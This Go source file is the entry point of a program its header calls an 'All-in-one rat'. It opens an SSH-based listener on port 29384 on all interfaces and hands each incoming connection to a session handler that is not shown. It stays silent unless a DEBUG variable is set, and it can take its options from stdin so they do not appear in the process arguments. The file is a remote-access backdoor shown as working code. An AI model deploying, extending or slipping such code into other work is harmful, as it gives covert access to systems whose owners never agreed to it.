package main

/*
 * omnissh.go
 * All-in-one rat
 * By J. Stuart McMurray
 * Created 20161108
 * Last Modified 20161110
 */

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

//const STDINREADTO = time.Minute
const STDINREADTO = time.Second

/* Debug prints diagnostic messages to stderr, if DEBUG is set */
var Debug = func(f string, a ...interface{}) {}

func init() {
	/* Handle debugging */
	if "" != os.Getenv("DEBUG") {
		Debug = log.Printf
	}
}

func main() {
	var (
		laddr = flag.String(
			"l",
			"0.0.0.0:29384",
			"Listen `address`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Listens on the specified port, is a rat.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	if a := getStdinFlags(); nil != a {
		os.Args = a
	}
	flag.Parse()

	/* Make SSH server config */
	sconf, err := MakeServerConfig()
	if nil != err {
		Debug("Unable to make server config: %v", err)
		os.Exit(1)
	}
	/* TODO: Print key fingerprint, maybe with flag? */

	/* Listen on network */
	l, err := net.Listen("tcp", *laddr)
	if nil != err {
		Debug("Unable to listen on %v: %v", *laddr, err)
		os.Exit(2)
	}
	Debug("Listening on %v", l.Addr())

	/* Accept and handle clients */
	for {
		c, err := l.Accept()
		if nil != err {
			Debug("Unable to accept new client: %v", err)
			os.Exit(3)
		}
		Debug("New connection %v -> %v", c.RemoteAddr(), c.LocalAddr())
		go Handle(c, sconf)
	}
}

/* getStdinFlags reads for up to a minute from stdin, or until a newline.  It
then splits what it received on | characters and returns the substrings.  A
maximum of 65kb of stdin will be read */
func getStdinFlags() []string {
	/* Channel on which to read read string */
	ch := make(chan string)
	/* String from stdin */
	var s string
	/* Read from stdin */
	go func() {
		reader := bufio.NewReader(os.Stdin)
		in, err := reader.ReadString('\n')
		if nil != err {
			Debug("Unable to read from stdin: %v", err)
		}
		ch <- in
	}()
	/* Wait for the timer or stdin */
	select {
	case <-time.After(STDINREADTO):
		return nil
	case s = <-ch:
	}
	/* No arguments */
	if "" == s {
		return nil
	}
	/* Remove trailing newline */
	a := append(
		[]string{os.Args[0]},
		strings.Split(strings.Trim(
			s,
			"\n| \t",
		), "|")...,
	)
	Debug("Arguments: %q", a)
	return a
}
